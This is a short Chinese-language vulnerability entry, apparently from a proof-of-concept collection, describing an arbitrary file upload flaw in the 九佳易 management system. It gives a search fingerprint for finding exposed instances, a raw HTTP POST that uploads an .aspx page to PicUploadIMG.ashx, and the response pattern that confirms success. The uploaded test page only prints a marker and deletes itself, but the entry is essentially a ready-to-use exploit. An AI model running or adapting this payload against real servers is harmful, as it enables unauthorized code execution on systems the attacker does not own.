# 九佳易管理系统PicUploadIMG存在任意文件上传漏洞

九佳易管理系统 ｜ 文件上传 ｜ —
- **指纹**：`body="/Scripts/Login_A8/"`

**Payload**
```
POST/weshop/Comm/PicUploadIMG.ashx?curTplb=001HTTP/1.1
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ7jrM31JCYae3wBT
------WebKitFormBoundaryJ7jrM31JCYae3wBT
Content-Disposition: form-data; name="Filedata"; filename="test123.aspx"
<%@ Page Language="C#"%><% Response.Write("test123"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------WebKitFormBoundaryJ7jrM31JCYae3wBT--
```
- **响应特征**：200 aspx